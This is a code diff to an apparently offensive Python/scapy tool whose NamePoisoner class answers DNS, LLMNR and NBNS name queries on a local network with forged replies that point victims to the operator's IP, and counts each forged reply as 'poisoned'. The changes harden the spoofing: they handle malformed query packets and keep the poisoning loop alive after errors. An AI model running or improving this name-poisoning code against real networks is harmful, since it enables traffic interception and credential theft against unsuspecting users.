@@ -43,8 +43,9 @@ def queried_name(pkt) -> str | None:
     if _dns_query_port(pkt) is not None:
         from scapy.layers.dns import DNS
         qd = _first(pkt[DNS].qd)
-        if qd is not None:
-            return _decode(qd.qname)
+        name = getattr(qd, "qname", None)            # malformed question -> Raw, no qname
+        if name:
+            return _decode(name)
 
     if pkt.haslayer("UDP") and int(pkt["UDP"].dport) == _NBNS_PORT:
         try:
@@ -66,7 +67,7 @@ def build_response(pkt, our_ip: str):
 
         q = pkt[DNS]
         qd0 = _first(q.qd)
-        if qd0 is None:
+        if qd0 is None or not getattr(qd0, "qname", None):   # malformed question
             return None
         ttl = 30 if port == _LLMNR_PORT else 120
         return (IP(src=pkt[IP].dst, dst=pkt[IP].src)
@@ -111,9 +112,12 @@ class NamePoisoner:  # pragma: no cover (needs root + live traffic)
     def _on(self, pkt):
         from scapy.sendrecv import send
 
-        if queried_name(pkt) is None:
+        try:
+            if queried_name(pkt) is None:
+                return
+            resp = build_response(pkt, self.our_ip)
+        except Exception:            # a hostile query must never kill the loop
             return
-        resp = build_response(pkt, self.our_ip)
         if resp is not None:
             send(resp, iface=self.iface, verbose=False)
             self.poisoned += 1
